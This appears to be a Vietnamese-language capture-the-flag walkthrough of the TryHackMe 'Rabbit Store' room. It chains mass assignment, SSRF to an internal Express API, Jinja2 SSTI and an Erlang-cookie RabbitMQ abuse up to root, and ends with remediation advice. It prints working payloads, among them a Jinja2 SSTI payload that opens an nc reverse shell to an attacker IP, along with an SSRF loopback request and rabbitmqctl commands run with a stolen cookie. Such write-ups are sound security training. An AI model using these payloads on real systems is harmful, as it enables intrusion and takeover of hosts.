@@ -1,0 +1,234 @@
+---
+title: 'Rabbit Store'
+description: "Mass-assignment kích hoạt tài khoản bị khóa, tính năng 'lưu file từ URL' bị lỗi SSRF chạm đến API nội bộ, trường username phản chiếu vào backend Jinja2 gây SSTI RCE, rồi một Erlang cookie ai cũng đọc được biến hash admin RabbitMQ thành mật khẩu root của máy."
+date: 2026-01-11
+platform: tryhackme
+room: 'Rabbit Store'
+roomUrl: 'https://tryhackme.com/room/rabbitstore'
+difficulty: medium
+tags:
+  - 'web'
+  - 'ssrf'
+  - 'ssti'
+  - 'rce'
+  - 'mass-assignment'
+  - 'rabbitmq'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'mass assignment'
+  - 'server-side request forgery'
+  - 'server-side template injection'
+  - 'world-readable secret file'
+  - 'password reuse'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Rabbit Store — Mass Assignment sang SSRF sang Jinja2 RCE, và một RabbitMQ Cookie dẫn đến Root**
+
+_Bài walkthrough phòng "Rabbit Store" trên TryHackMe. Một cổng lưu trữ tưởng chừng kín kẽ lại trao cả máy cho ta qua một chuỗi những lỗi tin tưởng nhỏ: một endpoint đăng ký cho phép ta tự đặt trạng thái subscription, một tính năng "lưu file từ URL" thực chất là SSRF, một API nội bộ chỉ tiếp cận được qua chính SSRF đó, một trường phản chiếu rồi rơi vào backend Jinja2 để server-side template injection, và cuối cùng là một Erlang cookie ai cũng đọc được — cho phép ta lấy hash admin của RabbitMQ, vốn được tái sử dụng nguyên vẹn làm mật khẩu root của hệ thống._
+
+> Flag, thông tin đăng nhập, Erlang cookie và hash root khôi phục được đều đã redact. Rabbit Store là phòng huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên mục tiêu luyện tập hợp pháp. Các giá trị hiển thị dạng `<redacted>` hoặc `THM{<redacted>}` là thật trên máy nhưng được giấu ở đây.
+
+---
+
+### **TL;DR — toàn bộ chuỗi tấn công**
+
+<Callout type="tldr">
+
+`POST /api/register` tin tưởng trường `subscription` do client gửi → đăng ký với `"subscription":"active"` (**mass assignment**) để mở khóa dashboard → tính năng "store from URL" (`/api/store-url`) của dashboard tải bất kỳ URL nào ta đưa vào (**SSRF**) → trỏ nó đến `http://127.0.0.1:3000/api/docs` để chạm **API Express nội bộ** (lớp Apache phía trước từ chối `/api/docs`) → endpoint mới lộ ra `/api/fetch_messeges_from_chatbot` phản chiếu `username` của ta vào một template **Jinja2** (Express proxy sang một app Flask nội bộ) → **SSTI → RCE** với quyền `azrael` → `/var/lib/rabbitmq/.erlang.cookie` **ai cũng đọc được** → xác thực với node RabbitMQ bằng `rabbitmqctl`, export definitions, và khôi phục hash mật khẩu SHA-256 của user `root` → hash đó **chính là** mật khẩu root của máy → `su root`.
+
+Mỗi mắt xích đều là server tin một input (hoặc một file) mà lẽ ra không nên tin.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+Một lần quét nhanh `rustscan`/`nmap` cho thấy bốn cổng đáng chú ý — và đáng lưu ý là một cụm Erlang/RabbitMQ:
+
+```text
+22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp    open  http    Apache httpd 2.4.52   -> redirects to http://cloudsite.thm/
+4369/tcp  open  epmd    Erlang Port Mapper Daemon (node: rabbit @ 25672)
+25672/tcp open  unknown (RabbitMQ inter-node / CLI port)
+```
+
+Dịch vụ HTTP chuyển hướng đến `cloudsite.thm`, và một sub-app lưu trữ nằm ở `storage.cloudsite.thm`, nên ta thêm cả hai vào `/etc/hosts`:
+
+```text
+$IP   cloudsite.thm storage.cloudsite.thm forge
+```
+
+`storage.cloudsite.thm` là một cổng lưu trữ file có đăng nhập và đăng ký. Cặp `4369`/`25672` (EPMD + một node `rabbit`) là gợi ý rõ ràng cần giữ lại cho bước leo thang đặc quyền sau này.
+
+### **Lỗ hổng — một chuỗi tin tưởng đặt nhầm chỗ**
+
+App đăng ký và đăng nhập qua một JSON API (`/api/register`, `/api/login`), và phản hồi đăng nhập mang theo một **JWT** có claim `subscription` là `inactive` với tài khoản mới — đó là lý do tài khoản vừa tạo bị báo "chưa kích hoạt" và không làm được gì.
+
+<Callout type="insight">
+
+Server quyết định ta được truy cập gì dựa trên các trường mà nó để _ta_ điều khiển. Đăng ký nhận giá trị `subscription` thẳng từ thân request (**mass assignment**), và sau đó tính năng "lưu file từ URL" tải bất kỳ URL nào ta đưa vào từ phía server (**SSRF**). Cả "tài khoản này đã trả phí" lẫn "request này đến từ bên trong" đều không hề được kiểm chứng — chúng chỉ là giá trị do client cung cấp. Mô hình đó, lặp lại, chính là toàn bộ máy.
+
+</Callout>
+
+### **Bước 1 — mass assignment: tự kích hoạt tài khoản của mình**
+
+Fuzzing `/api/` lộ ra `/api/docs` (luôn `403 Access denied`) và `/api/uploads` (`401` khi không có token, rồi _"Your subscription is inactive"_ khi có token). Vậy ta cần một subscription **active**. Chức năng đăng ký cho phép ta cứ thế mà xin:
+
+```text
+POST /api/register
+Content-Type: application/json
+
+{"email":"test1@gmail.com","password":"<redacted>","subscription":"active"}
+```
+
+Đăng nhập bằng tài khoản đó giờ trả về một JWT chứa `"subscription":"active"`, và ta được chuyển hướng đến `/dashboard/active`. Bức tường phí đã biến mất vì cờ "đã trả phí" vốn không phải thứ server được quyền tin.
+
+### **Bước 2 — tìm SSRF (store from URL)**
+
+Dashboard active tải `/assets/js/custom_script_active.js`, lộ ra thêm hai endpoint:
+
+```text
+POST /api/upload       # multipart file upload
+POST /api/store-url    # { "url": "..." } -> server fetches the URL and stores it
+```
+
+Ta kiểm thử `/api/store-url` bằng cách trỏ nó đến web server của chính mình:
+
+```text
+# attacker
+python3 -m http.server 8000
+
+# then POST {"url":"http://$ATTACKER_IP:8000/test.txt"} to /api/store-url
+# -> 10.x.x.x - - [.. ] "GET /test.txt HTTP/1.1" 200 -
+```
+
+Server tải URL của ta — một **SSRF** kinh điển. File đã tải hiện ra trong dashboard và được phục vụ lại ở `/api/uploads/<uuid>`, nên ta còn đọc được nội dung đã tải về.
+
+### **Bước 3 — SSRF vào API nội bộ**
+
+`/api/docs` bị chặn ở lớp biên bên ngoài (Apache), nhưng API thật sự là một app **Express** (phản hồi mang header `X-Powered-By: Express`, cổng mặc định là `3000`). Yêu cầu SSRF tải thẳng API trên loopback sẽ vượt qua hạn chế của front-end:
+
+```text
+{"url":"http://127.0.0.1:3000/api/docs"}
+```
+
+Nó trả về tài liệu API nội bộ, lộ ra một endpoint mới: `/api/fetch_messeges_from_chatbot`.
+
+### **Bước 4 — SSTI dẫn đến RCE (Express phía trước, Flask/Jinja2 phía sau)**
+
+Một `POST` đến `/api/fetch_messeges_from_chatbot` trước tiên đòi hỏi `username`, rồi (với `{"username":"admin"}`) trả lời rằng chatbot đang "trong quá trình phát triển" — nhưng nó **phản chiếu username của ta trở lại**. Một payload polyglot gây lỗi template:
+
+```text
+{"username":"${{<%[%'\\"}}%\\."}
+```
+
+Lỗi đến từ **Jinja2** — app Express proxy endpoint này sang một dịch vụ **Flask** nội bộ, nên input của ta rơi vào một template engine Python. Đây là server-side template injection, và SSTI trên Jinja2 là con đường RCE đáng tin cậy:
+
+```text
+{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ATTACKER_IP 4444 >/tmp/f').read() }}"}
+```
+
+```text
+# attacker
+nc -lvnp 4444
+# connect from $IP ...
+azrael@forge:~/chatbotServer$ id
+uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
+```
+
+Sau khi ổn định shell (`python3 -c 'import pty;pty.spawn("/bin/bash")'`), flag user nằm trong home của `azrael`:
+
+```text
+azrael@forge:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Bước 5 — leo thang đặc quyền: một Erlang cookie ai cũng đọc được**
+
+Các node Erlang xác thực lẫn nhau bằng một bí mật chung, chính là **Erlang cookie**. Trên máy này nó ai cũng đọc được:
+
+```text
+azrael@forge:/var/lib/rabbitmq$ ls -al .erlang.cookie
+-r-----r--  1 rabbitmq rabbitmq 16 .. .erlang.cookie      # note the 'r' for others
+azrael@forge:/var/lib/rabbitmq$ cat .erlang.cookie
+<redacted>
+```
+
+Với cookie đó, ta có thể giao tiếp với node `rabbit@forge` bằng quyền administrator. `epmd -names` xác nhận node, và `rabbitmqctl` cho phép liệt kê users:
+
+```text
+sudo rabbitmqctl --erlang-cookie '<redacted>' --node rabbit@forge list_users
+# user                                                                         tags
+# The password for the root user is the SHA-256 hashed value of the RabbitMQ
+#   root user's password. Please don't attempt to crack SHA-256.               []
+# root                                                                         [administrator]
+```
+
+Cái "user" có tên kỳ quặc thật ra là một **gợi ý**: mật khẩu `root` của hệ thống bằng giá trị SHA-256 của mật khẩu `root` trong RabbitMQ.
+
+### **Bước 6 — khôi phục mật khẩu root từ hash RabbitMQ**
+
+Export definitions của RabbitMQ và lấy hash lưu của `root`:
+
+```text
+cat /tmp/definitions.json | jq '.users[] | select(.name == "root")'
+# "hashing_algorithm": "rabbit_password_hashing_sha256",
+# "password_hash": "<redacted-base64>"
+```
+
+RabbitMQ lưu nó dạng `base64(<4-byte salt> + sha256(<4-byte salt> + password))`. Giải mã sang hex và bỏ đi 4 byte salt (8 ký tự hex) ở đầu; phần còn lại là digest SHA-256 thô — và theo gợi ý, nó _chính là_ mật khẩu root của Linux:
+
+```text
+echo "<redacted-base64>" | base64 -d | xxd -p -c 100
+# <8 hex salt><64 hex sha256>
+# strip the first 8 hex chars -> the 64-char SHA-256 = the root password
+```
+
+```text
+azrael@forge:~$ su root
+Password:        # the 64-char SHA-256 string
+root@forge:~# cat /root/root.txt
+THM{<redacted>}
+```
+
+Kích hoạt tài khoản → SSRF → API nội bộ → SSTI RCE → cookie ai cũng đọc được → RabbitMQ admin → hash tái sử dụng → root.
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Mỗi lỗ hổng đều nghiêm trọng khi đứng riêng; khi nối chuỗi, chúng đưa từ ẩn danh lên root:
+
+- **Mass assignment** cho bất kỳ người đăng ký nào tự cấp cho mình trạng thái trả phí/đặc quyền mà app dùng để kiểm soát truy cập.
+- **SSRF** biến server thành proxy xuyên qua chính ranh giới tin cậy của nó, phá vỡ hạn chế ở lớp biên — thứ duy nhất "bảo vệ" API nội bộ.
+- **SSTI** trên backend Jinja2 là thực thi mã từ xa trực tiếp với quyền của app.
+- **Một Erlang cookie ai cũng đọc được cộng với một bí mật tái sử dụng** rút gọn việc leo thang đặc quyền còn một lệnh `su` — hash admin RabbitMQ đồng thời là mật khẩu root của host.
+
+</Callout>
+
+### **Khuyến nghị khắc phục — chặn từng mắt xích**
+
+<Callout type="fix">
+
+1. **Đừng bao giờ gắn đặc quyền vào các trường do client gửi.** Đặt `subscription`/role ở phía server; bỏ qua các khóa đó khi đăng ký. Kiểm tra theo allow-list các trường.
+2. **Siết chặt bộ tải URL.** Phân giải và allow-list điểm đến, chặn dải loopback/link-local/metadata, tắt chuyển hướng đến host nội bộ — và đừng dựa vào một luật ở lớp biên mà chính back-end có thể bị bắt vượt qua.
+3. **Đừng bao giờ render input người dùng như template.** Truyền dữ liệu làm biến context, dùng render sandbox/escape, và giữ input chatbot ra khỏi chuỗi nguồn Jinja2.
+4. **Bảo vệ bí mật giữa các node và ngừng tái sử dụng chúng.** `.erlang.cookie` phải là `0400`, chỉ thuộc sở hữu của tài khoản dịch vụ; bí mật admin RabbitMQ không được trùng với mật khẩu root của hệ thống.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **"Đã trả phí", "admin", và "nội bộ" không phải sự thật trừ khi server kiểm tra.** Mass assignment và SSRF là cùng một lỗi lặp lại hai lần: tin một giá trị mà client điều khiển.
+- **SSRF là một bước pivot, không chỉ là một lệnh fetch.** Sức mạnh thật sự của nó ở đây là chạm được đến một API mà lớp biên đang che giấu.
+- **Input phản chiếu + một template engine = cứ coi như RCE.** Một thông báo lỗi nhắc tên Jinja2 đã đủ để quyết tâm theo hướng SSTI.
+- **Bí mật ai cũng đọc được và bí mật tái sử dụng là món quà cho leo thang đặc quyền.** Least privilege trên `.erlang.cookie`, và bí mật riêng cho từng hệ thống, sẽ chặn đứt hai bước cuối.
+
+Cảm ơn bạn đã đọc. Rabbit Store là bài học gọn gàng về nối chuỗi: năm lỗi tin tưởng vừa phải, không cái nào một mình là thảm họa, cộng lại thành ẩn-danh-đến-root.
